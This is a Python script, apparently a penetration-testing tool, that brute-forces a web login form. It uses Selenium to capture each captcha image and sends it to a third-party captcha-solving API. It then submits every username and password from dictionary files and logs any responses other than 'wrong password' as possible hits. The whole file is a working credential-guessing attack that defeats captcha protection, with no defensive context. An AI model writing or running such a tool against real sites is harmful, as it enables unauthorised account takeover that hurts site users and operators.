'''
explain: 调用第三方打码平台API
author: s1g0day
time: 2021/04/15
version: '0.3'
'''

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from PIL import Image
import time
import re
import base64
import json
import requests

# 验证码的获取
def picture(url):
    browser.get(url)
    browser.save_screenshot('VerifyCode\\pic.png')
    code_element = browser.find_element_by_xpath('//*[@id="ImageCheck"]')
    # print("验证码的坐标为：", code_element.location)
    # print("验证码的大小为：", code_element.size)
    left = code_element.location['x']#x点的坐标
    top = code_element.location['y']#y点的坐标
    right = code_element.size['width']+left#上面右边点的坐标
    height = code_element.size['height']+top#下面右边点的坐标
    image = Image.open('VerifyCode\\pic.png')
    code_image = image.crop((left, top, right, height))
    code_image.save('VerifyCode\\captcha.png')#截取的验证码图片保存为新的文件

# 验证码的获取和处理
def get_captcha(url):
    # 获取验证码图片
    browser.get(url)
    png = browser.find_element_by_id('ImageCheck')
    png.screenshot('VerifyCode\\capt.png')  # 将图片截屏并保存
    # 处理验证码
    img = Image.open('VerifyCode\\capt.png')

    img = img.convert('L')  # P模式转换为L模式(灰度模式默认阈值127)
    count = 160  # 设定阈值
    table = []
    for i in range(256):
        if i < count:
            table.append(0)
        else:
            table.append(1)

    img = img.point(table, '1')
    img.save('VerifyCode\\captcha.png')  # 保存处理后的验证码
    

# 验证码的识别
def base64_api(uname, pwd, typeid):
    
    # 图鉴打码平台api
    # 读取图片
    img = 'VerifyCode\\captcha.png'
    
    with open(img, 'rb') as f:
        base64_data = base64.b64encode(f.read())
        b64 = base64_data.decode()
    data = {"username": uname, "password": pwd,"typeid":typeid, "image": b64}
    result = json.loads(requests.post("http://api.ttshitu.com/predict", json=data).text)
    if result['success']:
        return result["data"]["result"]
    else:
        return result["message"]
    return ""

# 登录网页
def login(user,passwd,captcha):
    
    # 找到账号框并输入账号
    browser.find_element_by_id('txtLoginName').send_keys(user)
    # 找到密码框并输入密码
    browser.find_element_by_id('txtLoginPass').send_keys(passwd)
    '''
    找到验证码框并输入验证码
    '''
    browser.find_element_by_id('txtVerifyCode').send_keys(captcha)
    # 找到登陆按钮并点击
    browser.find_element_by_id('btnLogin').click()


    print('user:',user)
    print('passwd:',passwd)

    # 登录成功跳转，有一定时间差
    time.sleep(4)
    
    '''
    如果登录后存在alert弹窗，则开启自动按下键盘的 ENTER 键
    '''
    print('------------获取alert对话框的内容------------')
    alert = browser.switch_to.alert.text
    print ('alert: ',alert)  # 打印警告对话框内容
    print('------------ENTER关闭警告------------\n')
    browser.switch_to_alert().accept()
    #win32api.keybd_event(13, 0, 0, 0)

    alertlog(alert,user,passwd)

    
def alertlog(alert,log_user,log_passwd):

    '''写入日志'''
    # 因为不知道成功登录后会弹出什么框,故把所有不是账号或密码错误的信息写入到错误日志中
    if alert != "您填写的帐号或密码不正确，请再次尝试。":
        with open('log\\error.log','a') as file_object:
            file_object.write(alert+'user:'+log_user+',passwd'+log_passwd+'\n')
    
    
# 主函数
if __name__ == '__main__':
    
    options = webdriver.ChromeOptions()
    options.add_argument('--save-page-as-mhtml')
    browser = webdriver.Chrome(options=options)
    browser.implicitly_wait(10)
    url = 'http://xxx.com/Login.aspx'
    
   
    ttshitu_user=''      # 打码平台账号
    ttshitu_pass=''      # 打码平台密码
    
    username = []
    password = []

    with open('dic\\username.txt', 'r') as f:
        username = f.readlines()

    with open('dic\\password.txt', 'r') as f:
        password = f.readlines()
        
    for u in range(0,len(username)):
        for p in range(4932,len(password)):
            
            Remain_number = len(password)-p
            
            print("------------当前第%d行--------------------- " %p)
            print("------------剩余%d个密码-------------------" %Remain_number)
            login_user = username[u].rstrip('\n')
            login_passwd = password[p].rstrip('\n')
        
            print('------------开始获取二维码图片---------------')
            picture(url)
            print('------------开始识别二维码-------------------')
            captcha = re.findall("\d+",base64_api(uname=ttshitu_user, pwd=ttshitu_pass,typeid=1))[0]
            captcha.replace(" ", "")
            print('识别结果：', captcha)
            print('------------开始登录测试---------------------')
            login(login_user,login_passwd,captcha)
    print('------------字典已跑完，程序退出-------------')
    browser.quit()
